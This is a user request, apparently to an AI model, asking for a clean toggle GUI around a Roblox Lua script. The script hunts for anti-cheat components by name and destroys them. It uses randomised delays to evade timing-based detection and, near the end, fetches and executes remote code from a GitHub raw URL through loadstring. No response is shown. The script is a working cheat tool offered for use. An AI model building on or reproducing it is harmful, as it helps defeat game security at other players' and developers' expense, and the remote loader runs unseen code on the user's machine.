can you turn this into a really clean toggle Gui with a clean close button

local ACRunning = false
local ACRemovalInterval = 1 -- seconds between scans
local LastScanTime = 0

-- Improved non-blocking wait function
local function SecureWait(duration)
    local start = tick()
    local elapsed = 0
    while elapsed < duration and ACRunning do
        local delta = tick() - start
        task.wait(math.min(0.1, duration - elapsed)) -- Never wait more than 0.1s at a time
        elapsed = tick() - start
    end
end

-- Optimized deep scan with yield points
local function DeepScan(parent)
    local results = {}
    local children = parent:GetChildren()
    
    for i = 1, #children do
        local child = children[i]
        table.insert(results, child)
        
        -- Yield every 100 items to prevent freezing
        if i % 100 == 0 then
            task.wait()
        end
        
        local subResults = DeepScan(child)
        for j = 1, #subResults do
            table.insert(results, subResults[j])
        end
    end
    return results
end

-- Enhanced detection function with better performance
local function DetectAntiCheatComponents()
    local foundAC = {}
    local acStrength = 0
    local totalPossibleStrength = 0
    
    -- Expanded list of anti-cheat identifiers
    local commonACNames = {
        "AntiCheat", "AntiExploit", "AC_", "SecurityModule", "AntiHack", 
        "ExploitProtection", "CheatDetection", "HackShield", "VAC", "MoonSec", 
        "SimpleSpy", "Synapse", "Kick", "Ban", "AntiExploit", "ExploitDetection", 
        "HackDetection", "AntiInject", "ScriptProtection", "ScriptShield", 
        "AntiTamper", "MemoryProtect", "Badger", "Guardian", "Sentinel", 
        "Watchdog", "Defender", "Shield", "Protector", "DarkStar", "Elysian", 
        "Vanguard", "FairFight", "EasyAntiCheat", "BattlEye", "Nexus", 
        "Polaris", "CheatEngine", "CheatPunch", "GameGuard", "XignCode", 
        "nProtect", "HSHIELD", "PunkBuster", "Equ8", "Ricochet", "VACnet", 
        "FAC", "SAC", "Warden", "Denuvo", "Arbiter", "Obsidian", "Titan", 
        "Aegis", "Fortify", "Bulwark", "RiotShield", "Ironclad", "Sentry", 
        "Valkyrie", "Hyperion", "Artemis", "Apollo", "Athena", "Zeus", 
        "Odin", "Thor", "Fenrir", "Jormungandr", "Typhon", "Cerberus"
    }

    -- Services to check for AC components
    local servicesToCheck = {
        game:GetService("ReplicatedStorage"),
        game:GetService("ServerScriptService"),
        game:GetService("Players").LocalPlayer:WaitForChild("PlayerScripts"),
        game:GetService("Workspace"),
        game:GetService("Lighting"),
        game:GetService("StarterPlayer").StarterPlayerScripts,
        game:GetService("StarterPack"),
        game:GetService("StarterGui")
    }
    
    -- Check for specific AC names and components with yield points
    for serviceIndex, service in ipairs(servicesToCheck) do
        if not ACRunning then break end
        
        -- Yield every 2 services to prevent freezing
        if serviceIndex % 2 == 0 then
            task.wait()
        end
        
        local descendants = service:GetDescendants()
        for itemIndex, item in pairs(descendants) do
            if not ACRunning then break end
            
            -- Yield every 200 items to prevent freezing
            if itemIndex % 200 == 0 then
                task.wait()
            end
            
            for nameIndex, acName in ipairs(commonACNames) do
                if string.find(string.lower(item.Name), string.lower(acName)) then
                    local strength = 1 -- Base strength
                    local detectionType = "Name Match"
                    
                    -- Increase strength for certain components
                    if item:IsA("RemoteEvent") then
                        strength = strength + 3
                        detectionType = "RemoteEvent"
                    elseif item:IsA("RemoteFunction") then
                        strength = strength + 4
                        detectionType = "RemoteFunction"
                    elseif item:IsA("Script") then
                        strength = strength + 2
                        detectionType = "Script"
                    elseif item:IsA("ModuleScript") then
                        strength = strength + 3
                        detectionType = "ModuleScript"
                    elseif item:IsA("BindableEvent") or item:IsA("BindableFunction") then
                        strength = strength + 1.5
                        detectionType = "Bindable"
                    elseif item:IsA("LocalScript") then
                        strength = strength + 1.5
                        detectionType = "LocalScript"
                    end
                    
                    -- Check for obfuscated scripts (with pcall protection)
                    if item:IsA("Script") or item:IsA("LocalScript") or item:IsA("ModuleScript") then
                        local success, source = pcall(function()
                            return item.Source
                        end)
                        
                        if success and source then
                            if string.find(source, "getfenv") or string.find(source, "setfenv") or 
                               string.find(source, "loadstring") or string.find(source, "bytecode") or
                               string.find(source, "xor") or string.find(source, "encrypt") then
                                strength = strength + 2
                                detectionType = detectionType.." | Obfuscated"
                            end
                        end
                    end
                    
                    table.insert(foundAC, {
                        object = item,
                        name = item.Name,
                        path = item:GetFullName(),
                        type = item.ClassName,
                        strength = strength,
                        detection = detectionType
                    })
                    acStrength = acStrength + strength
                    totalPossibleStrength = totalPossibleStrength + 6 -- Max per item
                end
            end
        end
    end
    
    -- Check for hidden or protected scripts (with pcall protection)
    if ACRunning then
        pcall(function()
            local nilInstances = getnilinstances()
            for i, v in pairs(nilInstances) do
                if not ACRunning then break end
                
                -- Yield every 50 nil instances to prevent freezing
                if i % 50 == 0 then
                    task.wait()
                end
                
                for _, acName in ipairs(commonACNames) do
                    if string.find(string.lower(v.Name), string.lower(acName)) then
                        table.insert(foundAC, {
                            object = v,
                            name = v.Name,
                            path = "Hidden Instance",
                            type = v.ClassName,
                            strength = 6, -- Highest strength for hidden AC
                            detection = "Hidden Instance"
                        })
                        acStrength = acStrength + 6
                        totalPossibleStrength = totalPossibleStrength + 6
                    end
                end
            end
        end)
    end
    
    -- Check for memory protection (with pcall protection)
    if ACRunning then
        pcall(function()
            if not game:GetService("Stats").PerformanceStats:GetChildren() then
                table.insert(foundAC, {
                    name = "Memory Protection",
                    path = "Game Stats",
                    type = "System",
                    strength = 5,
                    detection = "Memory Protection"
                })
                acStrength = acStrength + 5
                totalPossibleStrength = totalPossibleStrength + 6
            end
        end)
    end
    
    -- Check for unusual script behavior (with pcall protection)
    if ACRunning then
        pcall(function()
            local scripts = game:GetService("ScriptContext"):GetScripts()
            for i, script in ipairs(scripts) do
                if not ACRunning then break end
                
                -- Yield every 100 scripts to prevent freezing
                if i % 100 == 0 then
                    task.wait()
                end
                
                if script.ClassName == "LocalScript" and script:IsDescendantOf(game:GetService("Players").LocalPlayer) == false then
                    table.insert(foundAC, {
                        object = script,
                        name = "Suspicious LocalScript",
                        path = script:GetFullName(),
                        type = "LocalScript",
                        strength = 4,
                        detection = "Unusual Behavior"
                    })
                    acStrength = acStrength + 4
                    totalPossibleStrength = totalPossibleStrength + 6
                end
            end
        end)
    end
    
    -- Check for known exploit detection patterns (with pcall protection)
    if ACRunning then
        pcall(function()
            local players = game:GetService("Players")
            if players:FindFirstChild("LocalPlayer") then
                local playerScripts = players.LocalPlayer:FindFirstChild("PlayerScripts")
                if playerScripts then
                    local descendants = playerScripts:GetDescendants()
                    for i, script in ipairs(descendants) do
                        if not ACRunning then break end
                        
                        -- Yield every 200 descendants to prevent freezing
                        if i % 200 == 0 then
                            task.wait()
                        end
                        
                        if script:IsA("LocalScript") then
                            local success, source = pcall(function()
                                return script.Source
                            end)
                            
                            if success and source and (string.find(source, "exploit") or string.find(source, "cheat") or 
                               string.find(source, "inject") or string.find(source, "hook")) then
                                table.insert(foundAC, {
                                    object = script,
                                    name = "Exploit Detection",
                                    path = script:GetFullName(),
                                    type = "LocalScript",
                                    strength = 5,
                                    detection = "Pattern Match"
                                })
                                acStrength = acStrength + 5
                                totalPossibleStrength = totalPossibleStrength + 6
                            end
                        end
                    end
                end
            end
        end)
    end
    
    return {
        components = foundAC,
        strength = acStrength,
        maxStrength = totalPossibleStrength,
        percentage = totalPossibleStrength > 0 and (acStrength / totalPossibleStrength) * 100 or 0,
        lastUpdate = os.time()
    }
end

local function RemoveAntiCheats()
    -- Random delay pattern to avoid timing-based detection
    SecureWait(math.random(0.15, 0.65))
    
    local success, err = pcall(function()
        if not ACRunning then return "Scan aborted" end
        
        -- Use the advanced detection system
        local acData = DetectAntiCheatComponents()
        local deletedCount = 0
        
        -- Remove all detected components with yield points
        for i, ac in ipairs(acData.components) do
            if not ACRunning then break end
            
            -- Yield every 50 deletions to prevent freezing
            if i % 50 == 0 then
                task.wait()
            end
            
            if ac.object and ac.object.Parent then
                pcall(function()
                    ac.object:Destroy()
                    deletedCount = deletedCount + 1
                end)
            end
        end
        
        -- Check for common anti-cheat containers with yield points
        if ACRunning then
            local suspectFolders = {"Security", "AntiCheat", "Protection", "Shield", "Guard"}
            for i, folderName in ipairs(suspectFolders) do
                if not ACRunning then break end
                
                task.wait() -- Yield between folder checks
                
                local folder = game:FindFirstChild(folderName)
                if folder and folder:IsA("Folder") then
                    pcall(function()
                        folder:Destroy()
                        deletedCount = deletedCount + 1
                    end)
                end
            end
        end
        
        -- Post-deletion cleanup
        if deletedCount > 0 and ACRunning then
            -- Force garbage collection with yields
            for i = 1, math.random(2, 5) do 
                SecureWait(math.random(0.1, 0.3))
                collectgarbage("collect")
                task.wait() -- Yield between GC calls
            end
            
            return ("Operation completed: %d items processed"):format(deletedCount)
        else
            return "Scan completed without findings"
        end
    end)
    
    if success then
        LastScanTime = tick()
        print("Scan result: " .. err)
    else
        warn("Error: " .. err:sub(1, 50))
    end
    
    return ACRunning
end

function ACRStart()
    if ACRunning then
        warn("Already running")
        return
    end
    
    ACRunning = true
    print("Starting security scan")
    
    -- Initial notifications
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Game Detected",
        Text = "Game has been detected...",
        Duration = 5
    })

    task.wait(1)

    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "AntiCheat Removal",
        Text = "Initializing advanced detection system...",
        Duration = 5
    })

    SecureWait(2)

    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "⚠️Warning",
        Text = "This Might Not Work On Every Games",
        Duration = 5
    })
    
    -- Create the removal loop with proper yielding
    coroutine.wrap(function()
        while ACRunning do
            local scanTime = math.random(ACRemovalInterval * 0.8, ACRemovalInterval * 1.2)
            SecureWait(scanTime)
            
            if not RemoveAntiCheats() then 
                break 
            end
        end
    end)()
end

function ACRStop()
    if not ACRunning then
        warn("Not active")
        return
    end
    
    ACRunning = false
    print("Scan terminated")
end

function ACSetInterval(seconds)
    if type(seconds) == "number" and seconds > 0 then
        ACRemovalInterval = seconds
        print("Interval updated to " .. seconds)
    else
        warn("Invalid value")
    end
end

-- Load
pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/LoadResources/refs/heads/main/ResSourcesLoaderSource", true))()
warn("StartedScript")
end)

-- Start with random delay to avoid immediate detection
task.delay(math.random(1, 3), ACRStart)
